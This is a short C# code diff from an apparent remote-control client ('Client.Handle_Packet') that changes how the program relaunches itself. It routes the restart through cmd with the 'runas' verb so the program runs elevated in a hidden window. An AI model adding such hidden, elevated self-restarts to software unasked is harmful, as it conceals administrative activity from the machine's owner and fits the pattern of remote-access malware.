@@ -23,10 +23,11 @@ namespace Client.Handle_Packet
                 {
                     StartInfo = new ProcessStartInfo
                     {
-                        FileName = Process.GetCurrentProcess().MainModule.FileName,
+                        FileName = "cmd",
+                        Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
                         WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                        Verb = "runas"
+                        Verb = "runas",
+                        UseShellExecute = true
                     }
                 };
                 proc.Start();
